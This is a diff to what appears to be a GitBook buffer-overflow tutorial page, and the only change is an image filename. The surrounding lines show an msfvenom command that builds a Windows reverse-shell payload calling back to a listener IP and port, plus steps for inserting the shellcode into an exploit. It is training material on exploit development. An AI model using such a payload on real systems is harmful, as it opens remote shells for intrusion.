@@ -335,7 +335,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 2. Open the exploit and add the shellcode to the payload section
 3. <mark style="color:yellow;">Make sure that the EXITFUNC consists of the bad chars and not the RETN value</mark>
 
-<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## NOP Sledding
 
